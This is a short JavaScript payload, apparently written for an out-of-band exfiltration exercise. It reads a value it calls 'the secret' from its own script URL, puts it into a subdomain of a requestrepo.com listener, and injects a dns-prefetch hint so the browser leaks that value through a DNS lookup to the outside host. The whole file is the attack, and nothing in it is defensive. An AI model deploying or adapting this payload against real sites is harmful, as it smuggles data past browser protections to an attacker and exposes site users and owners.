
(function() {
    // 1. Find the secret in the URL of THIS script
    const me = document.currentScript;
    const url = new URL(me.src);
    const rawSecret = url.searchParams.get("id") || "default";

    // 2. Sanitize
    const sanitizedQ = String(rawSecret).toLowerCase().replace(/[^a-z0-9]/g, '').substring(0, 63);

    if (sanitizedQ.length > 0) {
        const targetUrl = `https://${sanitizedQ}.nvz9ugfn.requestrepo.com`;

        // Force Prefetch Control
        const meta = document.createElement('meta');
        meta.httpEquiv = "x-dns-prefetch-control";
        meta.content = "on";
        document.head.appendChild(meta);

        // Inject Hints
        const link = document.createElement('link');
        link.rel = 'dns-prefetch';
        link.href = targetUrl;
        document.head.appendChild(link);
        
        console.log(`[OOB] Script URL param used: ${sanitizedQ}`);
    }
})();
